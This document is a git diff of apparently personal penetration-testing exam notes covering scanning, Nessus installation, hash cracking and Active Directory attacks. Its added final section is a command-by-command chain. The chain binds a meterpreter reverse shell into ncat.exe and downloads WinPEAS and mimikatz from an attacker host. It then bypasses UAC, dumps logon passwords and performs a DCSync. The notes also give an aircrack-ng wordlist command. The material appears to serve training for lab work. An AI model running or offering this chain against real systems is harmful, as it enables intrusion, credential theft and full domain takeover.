@@ -30,8 +30,6 @@ curl ifconfig.me
 
 ## 03. Scanning and Exploiting Network Services
 
-**TODO:** Research the difference between nmap and masscan.
-
 ### Tools for scanning and exploiting network services
 
 - **nmap**
@@ -50,8 +48,6 @@ nmap -p 80 --script http-generator.nse <target>
 nmap -p 443 --script=http-headers,http-title,http-generator 
 nmap --script="default and http-*"
 ```
-
-**TODO:** research about scripts
 
 ```bash
 # Masscan notes
@@ -101,6 +97,20 @@ cat ... | cut -d '/' -f 1
 ```
 
 ## 04. Nessus Workshop
+
+### Installation
+
+```bash
+curl --request GET \                           
+  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.7.1-ubuntu1404_amd64.deb' \
+  --output 'Nessus-10.7.1-ubuntu1404_amd64.deb'
+sudo dpkg -i Nessus-10.7.1-ubuntu1404_amd64.deb
+sudo systemctl enable nessusd
+sudo systemctl start nessusd
+# Navigate to https://localhost:8834
+# The credentials are the same as current linux user
+```
+
 
 ### Rooms to pass in TryHackMe
 
@@ -355,8 +365,9 @@ https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/
 - Analyze Password Spraying attacks (username = password)
 - Analyze certain hash that is used by xp_dirtee
 - Analyze exploit with xp_cmdshell (not that important for the exam)
+- Searchsploit
 - Crack NTLMv1 and NTLMv2, WPA hashes!!!
-  TODO: View from lecture how to use aircrack-ng
+  `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <file.cap>`
 
 - In theoretical envoronment - where in Windows and where in AD are the hashes stored
   SAM - C:\Windows\System32\config\SAM
@@ -404,11 +415,45 @@ https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/
 
 - Analyzing Bloodhound path
   - Finding user who can perform DCSync bit its not a domain/enterprise admin
-  - Finding attak paths from specific user
+  - Finding attack paths from specific user
 - Analyzing Nessus Findings (search for public exploits)
 - Crack hashes with Hashcat
 - Crack WiFi password with aircrack-ng
 - Analyzing vulnerabilities for local privilege escalation
   - Analyzing WinPEAS, WinPwn, LinPEAS output for potential privesc vectors
 - Performing EXE binding
-  `msfvenom -x ncat.exe -p windows/x64/reverse_tcp LHOST=eth0 LPORT=443 -f exe -o ncat_modified.exe`
+  
+  ```bash
+  # On the Host machine
+  https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe
+  msfvenom -x ncat.exe -p windows/x64/meterpreter_reverse_tcp LHOST=eth0 LPORT=443 -f exe -o ncat_modified.exe
+  mfsconsole
+  use exploit/multi/handler
+  set payload windows/x64/meterpreter_reverse_tcp
+  set LHOST eth0
+  set LPORT 443
+  exploit
+  # On the target machine run the ncat_modified.exe
+  # On the host machine
+  # Download WinPEAS and server it with python
+  python3 -m http.server 80
+  # On the target machine
+  shell
+  powershell
+  iwr http://<attacker-ip>/winpeas.exe -outfile winpeas.exe
+  .\winpeas.exe
+  # Privilege escalation via metasploit on host machine
+  # use exploit/windows/local/service_permissions_privesc
+  use exploit/windows/local/bypassuac_sluihijack
+  SET SESSION 1
+  # Now we have a meterpreter session with SYSTEM privileges
+  # Download mimikatz on the target machine
+  powershell iwr http://<attacker-ip>/mimikatz.exe -outfile mimikatz.exe
+  .\mimikatz.exe
+  privilege::debug
+  sekurlsa::logonpasswords
+  # Perform DCSync
+  lsadump::dcsync /domain:<FQDN> /user:username
+  ```
+
+TODO: Try WinPwn (3, 2)
